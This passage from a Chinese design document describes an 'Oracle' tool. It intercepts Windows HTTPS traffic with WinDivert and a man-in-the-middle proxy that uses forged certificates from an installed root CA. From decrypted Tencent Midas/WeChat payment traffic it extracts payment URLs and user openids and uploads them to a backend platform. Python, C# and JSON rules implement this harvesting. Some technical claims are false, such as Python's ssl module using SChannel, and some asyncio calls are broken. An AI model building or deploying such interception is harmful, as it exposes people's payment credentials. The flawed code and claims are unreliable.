                x509.SubjectAlternativeName([x509.DNSName(hostname)]),
                critical=False,
            )
            .sign(self._ca_key, hashes.SHA256())  # ← 用根 CA 签名
        )
        
        cert_pem = cert.public_bytes(serialization.Encoding.PEM)
        key_pem = key.private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
        
        self._cert_cache[hostname] = (cert_pem, key_pem)
        return cert_pem, key_pem
    
    # ── TLS 代理 ─────────────────────────────────
    
    async def proxy_connection(self, client_reader, client_writer):
        """处理一个 TLS 代理连接"""
        # 1. 从 ClientHello 提取 SNI
        client_hello = await client_reader.read(4096)
        sni = self._extract_sni(client_hello)
        if not sni:
            return
        
        # 2. 连接真实服务器
        remote_reader, remote_writer = await asyncio.open_connection(
            sni, 443
        )
        
        # 3. 转发 ClientHello 到真实服务器
        remote_writer.write(client_hello)
        await remote_writer.drain()
        
        # 4. 创建 SSL 上下文（Windows SChannel）
        client_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        cert_pem, key_pem = self.generate_cert(sni)
        client_ctx.load_cert_chain(cert_pem, key_pem)
        # 强制使用 Windows 的 SChannel
        client_ctx.load_default_certs()
        
        # 5. 包装客户端连接为 TLS（SChannel）
        client_ssl = await asyncio.start_tls(
            client_reader, client_writer, client_ctx, 
            server_side=True
        )
        
        # 6. 创建到真实服务器的 TLS 连接
        remote_ctx = ssl.create_default_context()
        remote_ssl = await asyncio.start_tls(
            remote_reader, remote_writer, remote_ctx,
            server_side=False, server_hostname=sni
        )
        
        # 7. 双向转发 + 凭证提取
        await self._bidirectional_relay(client_ssl, remote_ssl, sni)
```

#### 关键问题：Python ssl 模块是否用 SChannel？

在 Windows 上，**Python 的 `ssl` 模块默认使用 SChannel**。验证方式：

```python
import ssl
print(ssl.OPENSSL_VERSION)  
# 输出: "Schannel" ← 在 Windows 上就是这个
```

所以 `ssl.SSLContext` 在 Windows 上底层就是 SChannel。这是关键——我们不需要任何特殊库。

---

### 3.4 HTTP 协议解析引擎

从解密后的 TLS 流中提取 HTTP 请求和响应。

```python
class HttpStreamParser:
    """从 TCP 流中解析 HTTP 请求/响应对"""
    
    async def parse(self, data: bytes):
        """解析 HTTP 请求/响应"""
        # 支持 HTTP/1.1
        if data.startswith(b"GET") or data.startswith(b"POST"):
            return self._parse_http11(data)
        
        # 支持 HTTP/2 (前置字段 PRI * HTTP/2.0)
        if data.startswith(b"PRI"):
            return self._parse_http2(data)
        
        return None
    
    def _parse_http11(self, data: bytes) -> Optional[HttpMessage]:
        """解析 HTTP/1.1 消息"""
        try:
            # 分割头部和体
            header_end = data.index(b"\r\n\r\n")
            header_bytes = data[:header_end]
            body_bytes = data[header_end + 4:]
            
            # 解析头部
            lines = header_bytes.decode().split("\r\n")
            start_line = lines[0]
            headers = {}
            for line in lines[1:]:
                if ": " in line:
                    k, v = line.split(": ", 1)
                    headers[k.lower()] = v
            
            # 请求还是响应？
            is_request = start_line.startswith(("GET", "POST", "PUT", 
                                                "DELETE", "PATCH"))
            
            # 提取 URL 和方法
            if is_request:
                method, path, _ = start_line.split(" ")
                return HttpRequest(method, 
                    f"https://{headers.get('host', '')}{path}",
                    headers, body_bytes)
            else:
                _, status_code, status_text = start_line.split(" ", 2)
                return HttpResponse(int(status_code), 
                                   headers, body_bytes)
                                
        except (ValueError, IndexError, UnicodeDecodeError):
            return None
```

---

### 3.5 凭证智能提取引擎

这是业务逻辑层——从 HTTP 响应中提取支付凭证。

```python
class CredentialExtractor:
    """从 HTTP 响应中提取支付凭证"""
    
    # 支付 API 端点匹配模式
    PAY_ENDPOINTS = [
        "/v1/r/", "/web_save",
        "/CommonCallMpgo",
        "/wechat_query",
        "/create_order",
    ]
    
    # 支付 URL 提取正则
    PAY_URL_PATTERN = re.compile(
        r'weixin://wxpay/bizpayurl\?pr=[^\s"\'<>)]+'
    )
    
    async def extract(self, request: HttpRequest, 
                      response: HttpResponse) -> Optional[Credential]:
        """从 HTTP 请求-响应对中提取凭证"""
        
        # 1. 检查是否支付 API 端点
        if not self._is_pay_endpoint(request.url):
            return None
        
        # 2. 检查响应状态
        if response.status_code != 200:
            return None
        
        # 3. 提取支付 URL
        pay_url = self._extract_pay_url(response.body)
        if not pay_url:
            return None
        
        # 4. 提取 openid
        openid = self._extract_openid(request.body)
        
        # 5. 提取 offer_id（货品 ID）
        offer_id = self._extract_offer_id(request.url, request.body)
        
        # 6. 构建凭证
        return Credential(
            type=CredentialType.PAYMENT_URL,
            value=pay_url,
            platform=self._detect_platform(request.url),
            product_id=offer_id,
            account_name=openid[:16] if openid else "无",
            source_pipeline="oracle_driver",
            metadata={
                "source": "win_divert_schannel",
                "api_url": request.url,
                "openid": openid,
                "pay_method": self._extract_pay_method(request.body),
            },
        )
    
    def _extract_pay_url(self, body: str) -> Optional[str]:
        """从响应体中提取支付 URL"""
        if isinstance(body, bytes):
            body = body.decode("utf-8", errors="ignore")
        
        match = self.PAY_URL_PATTERN.search(body)
        if match:
            return match.group(0)
        
        # 备用：查 JSON 中的 sign 字段
        if '"sign"' in body and 'weixin://' in body:
            idx = body.index('weixin://')
            return body[idx:idx+80].split('"')[0].split("'")[0]
        
        return None
    
    def _extract_openid(self, body: str) -> str:
        """从请求体中提取 openid"""
        if isinstance(body, bytes):
            body = body.decode("utf-8", errors="ignore")
        
        match = re.search(r'openid=([A-F0-9]+)', body)
        return match.group(1) if match else ""
    
    def _extract_offer_id(self, url: str, body: str) -> str:
        """提取 offer_id（货品 ID）"""
        match = re.search(r'/v1/r/(\d+)/', url)
        if match:
            return match.group(1)
        match = re.search(r'appid=(\d+)', body)
        return match.group(1) if match else ""
    
    def _is_pay_endpoint(self, url: str) -> bool:
        return any(e in url for e in self.PAY_ENDPOINTS)
    
    def _detect_platform(self, url: str) -> str:
        if "unipay.qq.com" in url: return "QQ Midas"
        if "tenpay.com" in url: return "微信支付"
        return "未知平台"
```

---

## 四、系统质量设计

### 4.1 可靠性

```
┌──────────────────────────────────────────┐
│              守护进程 (Daemon)             │
│                                          │
│  ┌──────────┐  ┌──────────┐  ┌────────┐ │
│  │ 主捕获线程 │  │ 事件循环  │  │ 健康检查│ │
│  │ pydivert  │  │ asyncio  │  │        │ │
│  └──────────┘  └──────────┘  └────────┘ │
│       │              │            │      │
│       ▼              ▼            ▼      │
│  ┌──────────────────────────────────┐   │
│  │        崩溃恢复系统               │   │
│  │  • 捕获线程崩溃 → 自动重启        │   │
│  │  • 内存超限 → 清理连接跟踪表      │   │
│  │  • 驱动异常 → 重新安装驱动       │   │
│  │  • 证书过期 → 自动续期           │   │
│  └──────────────────────────────────┘   │
└──────────────────────────────────────────┘
```

### 4.2 性能指标

| 指标 | 目标 | 说明 |
|------|------|------|
| 最大并发连接 | 10,000 | 每个连接约 10KB 内存 |
| 包处理速率 | 50,000 包/秒 | 单核 WinDivert 上限约 100K |
| 新增连接延迟 | < 5ms | 驱动层到用户态延迟 |
| 内存上限 | 500MB | 超过自动清理 |
| TLS 握手延迟 | < 100ms | 证书生成缓存 + SChannel 原生 |

### 4.3 安全设计

```
证书安全:
  • 根 CA 密钥用 DPAPI 加密存储
  • 证书缓存在内存，不落盘
  • 运行时证书 1 小时自动轮换

数据安全:
  • 支付 URL 提取后立即转发，不存储原始流量
  • 日志脱敏（openid 只保留前 8 位）
  • 传输加密（工具端后端间用 JWT 认证）

降级保护:
  • 驱动加载失败 → 自动降级到 mitmproxy 模式
  • mitmproxy 失败 → 自动降级到 CDP 模式
  • CDP 失败 → 提示用户手动 F12
```

---

## 五、实施路线图

### Phase 1：核心引擎原型（2 周）

| 周 | 任务 | 产出 |
|----|------|------|
| 1 | WinDivert 包捕获 + 连接跟踪 | 能拦截 HTTPS 包，提取 SNI |
| 1 | TCP 流重组 | 能拼出完整 ClientHello |
| 2 | SChannel MITM 代理 | 能解密 HTTPS，看到 HTTP 内容 |
| 2 | 凭证提取 | 从 web_save 响应中拿到支付 URL |

### Phase 2：生产化（2 周）

| 周 | 任务 | 产出 |
|----|------|------|
| 3 | 多进程架构 + 守护进程 | 能稳定运行 24h+ |
| 3 | 性能优化 | 包处理达到 50K/s |
| 4 | 证书管理 + 自动安装 | 一键安装根 CA |
| 4 | 集成工具端后端 | 凭证自动上传到平台 |

### Phase 3：扩展（持续）

| 项 | 说明 |
|----|------|
| HTTP/2 支持 | 腾讯已逐渐迁移到 HTTP/2 |
| 移动端热点 | 手机 App 通过 PC 热点走 WinDivert |
| 小程序专用适配 | 微信小程序 WebSocket 流量解析 |
| Web UI 控制台 | 类似 Fiddler 的实时流量查看器 |

---

## 六、技术选型 — 世界级决策

### 6.1 核心原则

> **不对语言设限，每个组件用最合适的语言，用 IPC 打通。**

### 6.2 语言对决：各组件最优解

```
WinDivert 捕获层:
  C（原生 API）     ⭐⭐⭐ 极致性能，但手动内存管理
  C++               ⭐⭐⭐ WinDivert 官方示例用 C++
  C# (P/Invoke)     ⭐⭐⭐⭐ WinDivert.NET NuGet 包，成熟
  Rust               ⭐⭐⭐⭐ windivert crate，安全+高性能
  Python (pydivert)  ⭐⭐  简单但性能开销大 ← 当前方案

TCP 流重组:
  C++               ⭐⭐⭐ 手动优化
  Rust               ⭐⭐⭐⭐ Tokio + Bytes，零拷贝
  C#                 ⭐⭐⭐⭐ Span<byte> + 异步流，足够快
  Python             ⭐    GIL 下处理万级包/秒不现实

SChannel MITM:
  C# (.NET)          ⭐⭐⭐⭐⭐ SslStream 原生绑定 ← 唯一真神
  C++                ⭐⭐⭐⭐ 直接 SSPI API，但开发量巨大
  Rust               ⭐⭐   windows-rs 绑定不成熟
  Python             ⭐    ssl 模块 MITM 支持有问题

HTTP 解析:
  Rust (hyper)       ⭐⭐⭐⭐⭐ 行业标准，HTTP/1.1 + h2
  C# (Kestrel)       ⭐⭐⭐⭐⭐ ASP.NET Core 内置
  Node.js            ⭐⭐⭐⭐ 事件驱动，但解析层不如 Rust

凭证提取:
  Python             ⭐⭐⭐⭐⭐ 已有全部代码 ← 无需重写
  C#                 ⭐⭐⭐  需要重写正则+适配器
```

### 6.3 最终技术栈决策

```
┌─────────────────────────────────────────────────────────────────┐
│                    神谕核心 (C# .NET 8 Native AOT)              │
│                                                                 │
│  • WinDivert 包捕获    → WinDivert.NET (NuGet)                 │
│  • TCP 流重组          → System.IO.Pipelines (零拷贝)           │
│  • SChannel MITM       → SslStream (原生绑定)                   │
│  • HTTP 解析           → ASP.NET Core Kestrel                   │
│  • 凭证提取            → 自研提取引擎                           │
│  • 管理 API            → ASP.NET Core Minimal API               │
│  • CA 证书管理         → System.Security.Cryptography           │
│                                                                 │
│  编译: dotnet publish -c Release -r win-x64 --self-contained    │
│  产出: oracle.exe (~8MB，无运行时依赖)                           │
│  兼容: Windows 10/11 x64，无需 .NET 运行时                      │
└──────────────────────┬──────────────────────────────────────────┘
                       │ IPC: HTTP localhost:8801
                       ▼
┌─────────────────────────────────────────────────────────────────┐
│                Python 工具端（完全保留，不改动）                  │
│                                                                 │
│  凭证接收 → 账号映射 → 处理器链 → SQLite → 上传平台              │
│  前端 Dashboard + 用户管理                                      │
└─────────────────────────────────────────────────────────────────┘
```

### 6.4 为什么选 C#？

#### 理由 1：SChannel MITM 是核心瓶颈，C# 是唯一解

```
SChannel MITM 需要：
  • 服务端模式 SSL 上下文（接收客户端连接）
  • 客户端模式 SSL 上下文（连接真实服务器）
  • 动态证书加载
  • ALPN 协商（HTTP/2）
  
  C# SslStream:         ✅ 全部原生支持
  C++ SSPI:             ✅ 支持但需要 2000+ 行样板代码
  Rust:                 ⚠️ SChannel 绑定不完整
  Python ssl:           ❌ MITM 预读场景有 bug
  Go:                   ❌ 用的是 Go TLS，不是 SChannel
```

#### 理由 2：Native AOT 解决部署问题

```
dotnet publish --self-contained -c Release
  → 单个 oracle.exe，8MB
  → 不需要用户安装 .NET 运行时
  → 不需要任何 DLL 依赖
  → 双击就能运行
```

#### 理由 3：性能足够

```
C# .NET 8 性能对比：
  • 内存分配: Span<T> 零拷贝，和 C++ 同等水平
  • JSON 解析: System.Text.Json > Python 的 json 模块 10x
  • HTTP 解析: Kestrel 是世界上最快的 Web 服务器之一
  • 异步: ValueTask + PipeLine 比 Python asyncio 高效得多
```

### 6.5 为什么不纯 Rust？

Rust 是完美的候选，但有一个致命缺陷：**Windows 上的 SChannel 绑定不成熟**。

```
Rust 的 TLS 选项:
  • rustls:  纯 Rust 实现，不是 SChannel ❌
  • native-tls:  包装系统 TLS，但 Windows 支持有限 ⚠️
  • openssl:  需要用户安装 OpenSSL ❌
  • schannel-rs:  社区维护，API 不完整 ⚠️

C# 的 TLS 选项:
  • SslStream:  微软官方维护，完整 SChannel 支持 ✅
```

### 6.6 架构概要

```
oracle.exe (C# Native AOT)
  │
  ├── CaptureService          ← WinDivert 主循环
  │   ├── PacketFilter        ← 域名白名单过滤
  │   └── ConnectionTracker   ← TCP 连接跟踪
  │
  ├── TlsProxy               ← SChannel MITM
  │   ├── CertificateManager  ← 动态证书生成
  │   └── SslStreamHandler    ← 双向 TLS 代理
  │
  ├── HttpParser              ← HTTP/1.1 + h2 解析
  │
  ├── CredentialExtractor     ← 支付凭证提取
  │
  ├── ManagementApi           ← ASP.NET Core Minimal API
  │   ├── GET /status         ← 运行状态
  │   ├── POST /start         ← 启动捕获
  │   ├── POST /stop          ← 停止捕获
  │   └── POST /credential    ← 凭证回调
  │
  └── WebSocket               ← 实时推送凭证到前端

IPC:
  oracle.exe :8801  ──HTTP──▶  Python 工具端 :8800
                                │
                                └── 前端 :5173
```

---

## 八、可扩展架构设计 — 平台无关的凭证提取引擎

### 8.1 设计哲学：数据驱动，而非代码驱动

```
不要为每个平台写代码，而是让平台以数据的形式定义自己。
```

Oracle 核心引擎不应该知道任何平台的细节。它只做三件事：

1. **捕获并标准化** HTTPS 流量 → 输出 `NormalizedTransaction`
2. **用平台规则匹配** → 判断是否支付 API
3. **按规则提取凭证** → 输出统一格式的 `Credential`

平台规则是**数据文件**（JSON），不是代码。加一个新平台 = 加一个 JSON 文件，不需要改 Oracle 核心。

### 8.2 核心数据结构

```csharp
/// <summary>
/// 标准化后的 HTTP 事务 — 不包含任何平台特定逻辑
/// </summary>
public class NormalizedTransaction
{
    // 来源识别（自动捕获）
    public string Domain { get; set; } = "";        // api.unipay.qq.com
    public string Ip { get; set; } = "";            // 服务器 IP
    public string Method { get; set; } = "";        // POST
    public string Path { get; set; } = "";          // /v1/r/1450049871/web_save
    public string QueryString { get; set; } = "";   // ?t=xxx
    
    // HTTP 内容
    public Dictionary<string, string> RequestHeaders { get; set; } = new();
    public string RequestBody { get; set; } = "";
    public int StatusCode { get; set; }
    public string ResponseBody { get; set; } = "";
    
    // 元数据
    public string ConnectionId { get; set; } = "";
    public DateTime Timestamp { get; set; }
    public long DurationMs { get; set; }
}
```

```csharp
/// <summary>
/// 平台规则配置 — 纯数据，定义如何匹配和提取
/// </summary>
public class PlatformRule
{
    public string Name { get; set; } = "";          // "qq_midas"
    public string Description { get; set; } = "";    // "腾讯 Midas 支付"
    public int Priority { get; set; } = 100;         // 匹配优先级
    
    // ── 匹配规则（所有条件都满足才算匹配） ──
    public List<MatcherRule> Matchers { get; set; } = new();
    
    // ── 凭证提取规则 ──
    public List<ExtractorRule> Extractors { get; set; } = new();
}

public class MatcherRule
{
    public string Field { get; set; } = "";     // "domain" | "path" | "method" | "header" | "status"
    public string Operator { get; set; } = "contains"; // "equals" | "contains" | "regex" | "starts_with"
    public string Value { get; set; } = "";      // 匹配的值
}

public class ExtractorRule
{
    public string Name { get; set; } = "";       // "weixin_pay_url"
    public string CredentialType { get; set; } = "payment_url";
    public string Source { get; set; } = "response_body";  // "request_body" | "response_body" | "path" | "header"
    public string Pattern { get; set; } = "";    // 正则表达式
    public string OutputField { get; set; } = "value";  // 映射到 Credential 的哪个字段
}
```

### 8.3 平台规则示例

```json
// platforms/qq_midas.json
{
  "name": "qq_midas",
  "description": "腾讯 Midas 支付",
  "priority": 100,
  "matchers": [
    {"field": "domain", "operator": "regex", "value": ".*(unipay|storeapi)\.qq\.com"},
    {"field": "path", "operator": "contains", "value": "/web_save"}
  ],
  "extractors": [
    {
      "name": "weixin_pay_url",
      "credential_type": "payment_url",
      "source": "response_body",
      "pattern": "weixin://wxpay/bizpayurl\?pr=[^\s\"'<>)]+",
      "output_field": "value"
    },
    {
      "name": "openid",
      "credential_type": "",
      "source": "request_body",
      "pattern": "openid=([A-F0-9]+)",
      "output_field": "openid"
    },
    {
      "name": "pay_method",
      "credential_type": "",
      "source": "request_body",
      "pattern": "pay_method=(\w+)",
      "output_field": "pay_method"
    }
  ]
}
```

```json
// platforms/alipay.json（未来扩展）
{
  "name": "alipay",
  "description": "支付宝支付",
  "priority": 100,
  "matchers": [
    {"field": "domain", "operator": "regex", "value": ".*\.alipay\.com"},
    {"field": "path", "operator": "contains", "value": "/gateway.do"}
  ],
  "extractors": [
    {
      "name": "alipay_trade_url",
      "credential_type": "payment_url",
      "source": "response_body",
      "pattern": "alipay://[a-zA-Z0-9?=&]+",
      "output_field": "value"
    }
  ]
}
```

### 8.4 Pipeline 架构

```
                    ┌─────────────────────────┐
                    │   NormalizedTransaction  │
                    │   (统一格式，平台无关)     │
                    └──────────┬──────────────┘
                               │
                               ▼
                    ┌─────────────────────────┐
                    │   Matcher Pipeline       │
                    │                          │
                    │  ┌──────────────────┐   │
                    │  │ 平台规则加载器     │   │
                    │  │ platforms/*.json  │   │
                    │  └────────┬─────────┘   │
                    │           │              │
                    │  ┌────────▼─────────┐   │
                    │  │ 规则匹配引擎      │   │
                    │  │ 按 priority 排序  │   │
                    │  │ 并行匹配所有规则   │   │
                    │  └────────┬─────────┘   │
                    └───────────┼──────────────┘
                               │ 匹配成功
                               ▼
                    ┌─────────────────────────┐
                    │   Extractor Pipeline     │
                    │                          │
                    │  ┌──────────────────┐   │
                    │  │ 按规则提取凭证     │   │
                    │  │ 正则 / JSONPath   │   │
                    │  └────────┬─────────┘   │
                    │           │              │
                    │  ┌────────▼─────────┐   │
                    │  │ 构建 Credential   │   │
                    │  │ platform, value,  │   │
                    │  │ openid, ...      │   │
                    │  └────────┬─────────┘   │
                    └───────────┼──────────────┘
                               │
                               ▼
                    ┌─────────────────────────┐
                    │   CredentialQueue        │
                    │   → Python 工具端        │
                    └─────────────────────────┘
```

### 8.5 扩展性对比

| 维度 | 传统方式（硬编码） | Oracle 方式（数据驱动） |
|------|------------------|----------------------|
| **加新平台** | 改 C# 代码，重新编译部署 | 加一个 JSON 文件，热加载 |
| **修改规则** | 改代码，PR 评审，发布 | 改 JSON，秒级生效 |
| **规则复杂度** | 受限于代码结构 | 正则 + 条件组合，灵活 |
| **用户自定义** | 需要懂编程 | 编辑 JSON 即可 |
| **调试** | 需要 IDE | 实时预览匹配结果 |

### 8.6 从捕获到识别的完整流

```
WinDivert 捕获 HTTPS 包
  → SChannel 解密
    → HTTP 解析
      → NormalizedTransaction
        ↓
  加载所有 platforms/*.json
        ↓
  for each rule (按 priority 排序):
    if 所有 matcher 都匹配:
      for each extractor:
        从 request_body / response_body 提取值
        填充到 Credential
      ↓
  输出 Credential:
  {
    "type": "payment_url",
    "value": "weixin://wxpay/bizpayurl?pr=XXX",
    "platform": "qq_midas",        ← 由规则 name 决定
    "domain": "api.unipay.qq.com", ← 自动捕获
    "endpoint": "/v1/r/.../web_save",
    "openid": "B7C04C6D...",
    "account_name": "",             ← Python 端查表填充
    "metadata": {
      "rule_name": "qq_midas",
      "pay_method": "wechat",
      "product_id": "1450049871"
    }
  }
```

### 8.7 对当前代码的影响

**改动很小** — 只需要改 `TlsProxy.cs` 中的 `RelayTrafficAsync` 方法：

当前：
```csharp
// 直接在转发循环中硬编码提取 weixin://
if (responseStr.Contains("weixin://wxpay/bizpayurl?pr="))
{
    var credential = ExtractCredential(responseStr, sni);
    ...
}
```

改为：
```csharp
// 构建 NormalizedTransaction，送入 Pipeline
var tx = new NormalizedTransaction
{
    Domain = sni,
    Path = requestPath,  // 需要从请求中提取
    Method = requestMethod,
    RequestBody = requestBody,
    ResponseBody = responseStr,
    StatusCode = statusCode,
};

// Pipeline 自动匹配平台规则，提取凭证
var credentials = _pipeline.Process(tx);
foreach (var cred in credentials)
    await _credentialQueue.EnqueueAsync(cred);
```

### 8.8 总结

```
Oracle 核心引擎 = 捕获 + 解密 + 标准化
平台适配逻辑 = platforms/*.json 数据文件

加一个平台 = 加一个 JSON 文件
改一个规则 = 改 JSON 中的正则
用户自定义 = 克隆默认模板改几行
全场景覆盖 = 只要 HTTPS 就都能识别
```
